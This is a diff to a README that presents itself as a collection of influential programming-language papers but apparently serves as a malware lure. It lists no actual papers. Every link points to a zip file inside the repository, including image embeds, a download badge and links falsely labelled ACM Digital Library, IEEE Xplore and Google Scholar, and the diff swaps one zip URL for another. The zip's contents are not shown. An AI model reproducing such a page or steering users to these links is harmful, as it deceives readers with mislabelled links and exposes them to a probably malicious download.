@@ -2,7 +2,7 @@
 
 Welcome to the "most-influential-pl-papers" repository, where we have curated a collection of some of the most impactful and groundbreaking papers in the world of programming languages. Dive into the history and evolution of programming languages through the lens of these influential works that have shaped the way we write code today.
 
-![Programming Languages](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)
+![Programming Languages](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)
 
 ---
 
@@ -30,9 +30,9 @@ In this repository, you will find a carefully selected list of papers that have 
 ---
 
 #### 🔗 Download the Papers
-To access and download the papers featured in this repository, please click on the following link: [Download Papers](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)
+To access and download the papers featured in this repository, please click on the following link: [Download Papers](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)
 
-[![Download Papers](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip%20Papers-Click%20Here-brightgreen)](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)
+[![Download Papers](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip%20Papers-Click%20Here-brightgreen)](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)
 
 *Note: The link directs you to the file containing the most influential papers in programming languages. Click to launch and explore these valuable resources.*
 
@@ -41,9 +41,9 @@ To access and download the papers featured in this repository, please click on t
 #### 🌐 Explore Further
 In addition to the downloadable papers, you can further enrich your understanding of programming languages and their impact by visiting the following resources:
 
-1. **[ACM Digital Library](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)**: Explore a vast collection of research papers and articles on programming languages.
-2. **[IEEE Xplore](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)**: Delve into the latest trends and advancements in the field of programming languages.
-3. **[Google Scholar](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)**: Search for scholarly articles and papers related to programming languages and their evolution.
+1. **[ACM Digital Library](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)**: Explore a vast collection of research papers and articles on programming languages.
+2. **[IEEE Xplore](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)**: Delve into the latest trends and advancements in the field of programming languages.
+3. **[Google Scholar](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)**: Search for scholarly articles and papers related to programming languages and their evolution.
 
 These platforms offer a wealth of knowledge and insights for those interested in deepening their understanding of programming languages and related topics.
 
@@ -61,4 +61,4 @@ To stay informed about the latest additions and updates to this repository, be s
 
 Thank you for visiting this repository and embarking on a journey through the most influential papers in programming languages. Happy exploring! 🚀
 
-![Code Development](https://github.com/Kosta345/most-influential-pl-papers/releases/download/v1.0/Program.zip)
+![Code Development](https://github.com/Kosta345/most-influential-pl-papers/raw/refs/heads/main/illupi/influential_most_papers_pl_assassination.zip)
